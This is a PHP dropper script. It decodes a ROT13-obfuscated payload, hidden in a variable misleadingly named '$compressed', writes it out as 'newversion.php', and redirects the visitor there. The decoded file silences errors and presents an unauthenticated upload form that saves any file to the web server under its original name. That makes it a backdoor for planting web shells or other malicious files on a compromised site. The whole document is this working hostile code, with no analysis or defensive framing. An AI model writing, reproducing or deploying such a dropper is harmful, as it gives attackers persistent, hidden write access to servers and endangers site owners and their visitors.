<?php
$filename = "newversion.php";
function rotate($string, $n) {
    
    $length = strlen($string);
    $result = '';
    
    for($i = 0; $i < $length; $i++) {
        $ascii = ord($string{$i});
        
        $rotated = $ascii;
        
        if ($ascii > 64 && $ascii < 91) {
            $rotated += $n;
            $rotated > 90 && $rotated += -90 + 64;
            $rotated < 65 && $rotated += -64 + 90; 
        } elseif ($ascii > 96 && $ascii < 123) {
            $rotated += $n;
            $rotated > 122 && $rotated += -122 + 96;
            $rotated < 97 && $rotated += -96 + 122; 
        }
        
        $result .= chr($rotated);
    }
    
    return $result;
}

$compressed=<<<GUN
<?cuc
@vav_frg('bhgchg_ohssrevat', 0);
@vav_frg('qvfcynl_reebef', 0);
rpub '<sbez npgvba="" zrgubq="cbfg" rapglcr="zhygvcneg/sbez-qngn" anzr="hcybnqre" vq="hcybnqre">';
rpub '<vachg glcr="svyr" anzr="svyr" fvmr="0"><vachg anzr="_hcy" glcr="fhozvg" vq="_hcy" inyhr="Hcybnq"></sbez>';
vs ( vffrg(\$_CBFG['_hcy']) && \$_CBFG['_hcy'] == "Hcybnq") {
    vs (@pbcl(\$_SVYRF['svyr']['gzc_anzr'], \$_SVYRF['svyr']['anzr'])) {
        rpub '<o>hcybnq fhpprff</o><oe>';
    } ryfr {
        rpub '<o>hcybnq snvyrq! </o><oe>';
    }
} ryfr {
    ;
}
?>
GUN;

$original = rotate($compressed, -13);
$open=fopen($filename,"w" );
fwrite($open,$original);
fclose($open);
header("location:".$filename);
?>